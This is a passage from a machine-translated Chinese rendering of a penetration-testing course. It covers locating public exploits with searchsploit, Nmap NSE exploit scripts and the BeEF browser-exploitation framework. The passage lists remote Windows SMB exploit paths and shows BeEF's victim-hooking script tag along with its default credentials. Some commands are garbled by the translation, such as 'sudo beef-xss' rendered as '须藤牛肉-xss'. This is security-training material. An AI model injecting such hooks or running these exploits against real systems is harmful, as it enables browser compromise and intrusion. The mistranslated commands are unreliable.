<div style="position:absolute;top:3973;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-c, --case [Term] 执行区分大小写的搜索（默认为 inSEnsITiVe）。</font></font></nobr></div>
<div style="position:absolute;top:3990;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-e, --exact [Term] 对漏洞利用标题执行完全匹配（默认为 AND）[I</font></font></nobr></div>
<div style="position:absolute;top:4007;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-h, --help    </font></font></nobr></div>
<div style="position:absolute;top:4007;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示此帮助屏幕。</font></font></nobr></div>
<div style="position:absolute;top:4024;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-j, --json [Term] 以 JSON 格式显示结果。</font></font></nobr></div>
<div style="position:absolute;top:4041;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-m, --mirror [EDB-ID] 镜像（又名复制）到当前工作目录的漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:4058;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-o, --overflow [Term] 允许漏洞利用标题溢出其列。</font></font></nobr></div>
<div style="position:absolute;top:4075;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p, --path [EDB-ID] 显示漏洞利用的完整路径（并复制路径 </font></font></nobr></div>
<div style="position:absolute;top:4092;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t, --title [Term] 仅搜索漏洞利用标题（默认为标题和文件</font></font></nobr></div>
<div style="position:absolute;top:4109;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-u, --update    </font></font></nobr></div>
<div style="position:absolute;top:4109;left:328"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查并安装任何exploitdb 包更新（deb 或</font></font></nobr></div>
<div style="position:absolute;top:4126;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-w, --www [Term] 显示 Exploit-DB.com 的 URL 而不是本地路径。</font></font></nobr></div>
<div style="position:absolute;top:4143;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-x, --examine [EDB-ID] 使用 $PAGER 检查（又名打开）漏洞。</font></font></nobr></div>
<div style="position:absolute;top:4159;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- 颜色    </font></font></nobr></div>
<div style="position:absolute;top:4159;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在搜索结果中禁用颜色突出显示。</font></font></nobr></div>
<div style="position:absolute;top:4176;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- ID    </font></font></nobr></div>
<div style="position:absolute;top:4176;left:319"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">显示 EDB-ID 值而不是本地路径。</font></font></nobr></div>
<div style="position:absolute;top:4193;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--nmap [file.xml] 使用服务版本检查 Nmap 的 XML 输出中的所有结果</font></font></nobr></div>
<div style="position:absolute;top:4211;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用“-v”（详细）尝试更多组合</font></font></nobr></div>
<div style="position:absolute;top:4228;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--exclude="term" 从结果中删除值。</font><font style="vertical-align: inherit;">通过使用“|” </font><font style="vertical-align: inherit;">把你分开</font></font></nobr></div>
<div style="position:absolute;top:4244;left:336"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如 --exclude="term1|term2|term3"。</font></font></nobr></div>
<div style="position:absolute;top:4264;left:320"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 411 - searchsploit 选项帮助菜单</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">最后，帮助菜单的“注释”部分显示了有用的搜索提示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========</font></font></nobr></div>
<div style="position:absolute;top:4345;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">笔记 </font></font></nobr></div>
<div style="position:absolute;top:4362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">========</font></font></nobr></div>
<div style="position:absolute;top:4379;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 您可以使用任意数量的搜索词。</font></font></nobr></div>
<div style="position:absolute;top:4396;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 搜索词不区分大小写（默认情况下），并且排序无关。</font></font></nobr></div>
<div style="position:absolute;top:4413;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 如果您希望通过区分大小写的搜索来减少结果，请使用“-c”。</font></font></nobr></div>
<div style="position:absolute;top:4430;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 和/或 '-e' 如果您希望使用完全匹配来过滤结果。</font></font></nobr></div>
<div style="position:absolute;top:4447;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 使用“-t”排除文件路径以过滤搜索结果。</font></font></nobr></div>
<div style="position:absolute;top:4464;left:133"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 删除误报（尤其是在使用数字搜索时 - 即版本）。</font></font></nobr></div>
<div style="position:absolute;top:4481;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* 更新或显示帮助时，搜索词将被忽略。</font></font></nobr></div>
<div style="position:absolute;top:4500;left:343"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 412 - searchsploit 帮助说明</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:4529;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以搜索所有</font><font style="vertical-align: inherit;">针对</font><i><font style="vertical-align: inherit;">SMB</font></i><font style="vertical-align: inherit;">服务的</font><font style="vertical-align: inherit;">可用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">远程</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">攻击</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:4549;left:109"><nobr><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">具有以下语法的</font><i><font style="vertical-align: inherit;">Windows</font></i><font style="vertical-align: inherit;">操作系统：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:4584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">searchsploit 远程 smb 微软 windows</font></font></font></b></nobr></div>
<div style="position:absolute;top:4601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:4618;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用标题    </font></font></nobr></div>
<div style="position:absolute;top:4618;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">小路</font></font></nobr></div>
<div style="position:absolute;top:4635;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">(/usr/share/exploitdb/)</font></font></nobr></div>
<div style="position:absolute;top:4652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:4669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft DNS RPC 服务 - 'extractQu | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/16366.rb</font></font></nobr></div>
<div style="position:absolute;top:4685;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - 'srv2.sys' SMB Cod | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/40280.py</font></font></nobr></div>
<div style="position:absolute;top:4702;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - 'srv2.sys' SMB Neg | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/14674.txt</font></font></nobr></div>
<div style="position:absolute;top:4719;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - 'srv2.sys' SMB Neg | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/16363.rb</font></font></nobr></div>
<div style="position:absolute;top:4737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - SMB 中继代码 Exe | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/16360.rb</font></font></nobr></div>
<div style="position:absolute;top:4753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - SmbRelay3 NTLM 代表 | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/7125.txt</font></font></nobr></div>
<div style="position:absolute;top:4770;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows - 未经身份验证的 SM | </font><font style="vertical-align: inherit;">漏洞利用/windows/dos/41891.rb</font></font></nobr></div>
<div style="position:absolute;top:4787;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 2000/XP - SMB 验证 | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/20.txt</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:4927;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="5"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 5 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:4960;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:6037;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:6037;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:6037;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">446</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 2003 SP2 - 'ERRATICG | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/41929.py</font></font></nobr></div>
<div style="position:absolute;top:5072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows 95/Windows for Workg | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/20371.txt</font></font></nobr></div>
<div style="position:absolute;top:5089;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows NT 4.0 SP5 / 终端 | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/19197.txt</font></font></nobr></div>
<div style="position:absolute;top:5106;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows Server 2008 R2 (x64) | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/41987.py</font></font></nobr></div>
<div style="position:absolute;top:5124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows Vista/7 - SMB2.0 否定 | </font><font style="vertical-align: inherit;">漏洞利用/windows/dos/9594.txt</font></font></nobr></div>
<div style="position:absolute;top:5140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Microsoft Windows Windows 7/2008 R2 (x |exploits/windows_x86-64/remote/42031.py</font></font></nobr></div>
<div style="position:absolute;top:5157;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗 Windows 7/8.1/2008 R | </font><font style="vertical-align: inherit;">漏洞利用/windows/remote/42315.py</font></font></nobr></div>
<div style="position:absolute;top:5174;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">微软视窗 Windows 8/8.1/2012 R | </font><font style="vertical-align: inherit;">漏洞利用/windows_x86-64/remote/42030.py</font></font></nobr></div>
<div style="position:absolute;top:5191;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">------------------------------- ----------- -----------------------------</font></font></nobr></div>
<div style="position:absolute;top:5208;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Shellcodes：没有结果</font></font></nobr></div>
<div style="position:absolute;top:5245;left:235"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 413 - 使用 searchsploit 列出可用的远程 Windows SMB 漏洞利用</font></font></i></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:5275;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.2.2 Nmap NSE 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5310;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 是最流行的枚举工具之一。</font><font style="vertical-align: inherit;">这个工具的一个非常强大的功能是</font></font></nobr></div>
<div style="position:absolute;top:5329;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap 脚本引擎，</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">374</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，顾名思义，引入了自动化的能力</font></font></nobr></div>
<div style="position:absolute;top:5349;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用脚本的各种任务。</font></font></nobr></div>
<div style="position:absolute;top:5382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nmap Scripting Engine 自带了多种脚本来枚举、暴力破解、模糊测试、检测、</font></font></nobr></div>
<div style="position:absolute;top:5401;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以及漏洞利用服务。</font><font style="vertical-align: inherit;">Nmap 脚本引擎提供的完整脚本列表可以是</font></font></nobr></div>
<div style="position:absolute;top:5420;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 /usr/share/nmap/scripts 下找到。</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">快速搜索 NSE 脚本中的单词</font></font></nobr></div>
<div style="position:absolute;top:5440;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“漏洞利用”返回许多结果：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5475;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /usr/share/nmap/scripts</font></font></font></b></nobr></div>
<div style="position:absolute;top:5508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/nmap/scripts$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep 漏洞利用 *.nse</font></font></font></b></nobr></div>
<div style="position:absolute;top:5525;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">clamav-exec.nse：利用易受未经身份验证的 clamav 命令攻击的 ClamAV 服务器</font></font></nobr></div>
<div style="position:absolute;top:5542;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行。</font></font></nobr></div>
<div style="position:absolute;top:5560;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http-awstatstotals-exec.nse：利用 Awstats 中的远程代码执行漏洞</font></font></nobr></div>
<div style="position:absolute;top:5576;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">总计 1.0 到 1.14</font></font></nobr></div>
<div style="position:absolute;top:5593;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http-axis2-dir-traversal.nse：利用 Apache Ax 中的目录遍历漏洞</font></font></nobr></div>
<div style="position:absolute;top:5610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">is2 版本 1.4.1 由</font></font></nobr></div>
<div style="position:absolute;top:5627;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http-fileupload-exploiter.nse：利用 Web 应用程序中不安全的文件上传表单</font></font></nobr></div>
<div style="position:absolute;top:5644;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:5664;left:281"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 414 - 列出包含“漏洞利用”一词的 NSE 脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:5693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以通过</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">--script-help</font></font></b><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来列出有关特定 NSE 脚本的信息</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:5712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后跟脚本文件名：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:5747;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">nmap --script-help=clamav-exec.nse</font></font></font></b></nobr></div>
<div style="position:absolute;top:5764;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 2019-05-17 13:41 MDT 开始 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:5798;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">clamav-exec</font></font></nobr></div>
<div style="position:absolute;top:5815;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别：漏洞利用</font></font></nobr></div>
<div style="position:absolute;top:5832;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://nmap.org/nsedoc/scripts/clamav-exec.html</font></font></nobr></div>
<div style="position:absolute;top:5849;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用易受未经身份验证的 clamav 命令执行的 ClamAV 服务器。</font></font></nobr></div>
<div style="position:absolute;top:5883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ClamAV 服务器 0.99.2，可能还有其他以前的版本，允许执行</font></font></nobr></div>
<div style="position:absolute;top:5900;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经身份验证的危险服务命令。</font><font style="vertical-align: inherit;">具体来说，命令“扫描”</font></font></nobr></div>
<div style="position:absolute;top:5917;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于列出系统文件，命令“SHUTDOWN”关闭</font></font></nobr></div>
<div style="position:absolute;top:5934;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务。</font><font style="vertical-align: inherit;">这个漏洞是由 Alejandro Hernandez (nitr0us) 发现的。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:5987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">374 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/nse.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:6115;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="6"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 6 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:6148;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:7225;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:7225;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:7225;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">447</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6260;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个不带参数的脚本测试命令“SCAN”的可用性。</font></font></nobr></div>
<div style="position:absolute;top:6294;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">参考：</font></font></nobr></div>
<div style="position:absolute;top:6312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* https://twitter.com/nitr0usmx/status/740673507684679680</font></font></nobr></div>
<div style="position:absolute;top:6328;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">* https://bugzilla.clamav.net/show_bug.cgi?id=11585</font></font></nobr></div>
<div style="position:absolute;top:6348;left:279"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 415 - 使用 Nmap NSE 获取有关脚本的信息</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这提供了有关漏洞和外部信息资源的信息。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:6412;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">14.2.2.3 浏览器开发框架（BeEF）</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6446;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Browser Exploitation Framework ( </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BeEF</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">375</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个专注于客户端的渗透测试工具</font></font></nobr></div>
<div style="position:absolute;top:6466;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Web 浏览器中执行的攻击。</font><font style="vertical-align: inherit;">不用说，它包含了大量的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:6498;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要列出可用的漏洞，我们必须首先启动所需的服务。</font><font style="vertical-align: inherit;">这可以做到</font></font></nobr></div>
<div style="position:absolute;top:6518;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali Linux 中使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">beef-xss</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令自动：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:6552;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">须藤牛肉-xss</font></font></font></b></nobr></div>
<div style="position:absolute;top:6569;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] BeEF 服务已启动，请稍候。</font></font></nobr></div>
<div style="position:absolute;top:6587;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 打开浏览器后，您可能需要刷新浏览器。</font></font></nobr></div>
<div style="position:absolute;top:6604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 用户界面网址：http://127.0.0.1:3000/ui/panel</font></font></nobr></div>
<div style="position:absolute;top:6620;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 钩子：&lt;script src="http://&lt;IP&gt;:3000/hook.js"&gt;&lt;/script&gt;</font></font></nobr></div>
<div style="position:absolute;top:6637;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 示例：&lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</font></font></nobr></div>
<div style="position:absolute;top:6657;left:311"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 416 - 在 Kali Linux 中启动 BeEF 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:6686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以</font><font style="vertical-align: inherit;">使用默认凭据</font><i><font style="vertical-align: inherit;">beef/beef</font></i><font style="vertical-align: inherit;">浏览到</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://127.0.0.1:3000/ui/panel</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来登录</font></font><i><font style="vertical-align: inherit;"></font></i><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:6706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架主界面：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:7175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">375 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(Beef, 2019), http://beefproject.com</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:7303;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="7"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 7 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:7336;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:8413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:8413;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:8413;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">448</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:7835;left:363"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 258：BeEF 主登录页面</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:7866;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">登录后，我们将需要挂钩受害浏览器。</font><font style="vertical-align: inherit;">由于高级挂钩在外面</font></font></nobr></div>
<div style="position:absolute;top:7885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个特定模块的范围，我们将只使用框架提供的演示页面</font></font></nobr></div>
<div style="position:absolute;top:7905;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单击突出显示的演示页面链接。</font><font style="vertical-align: inherit;">这将允许 BeEF 钩住我们的浏览器：</font></font></nobr></div>
</span></font>

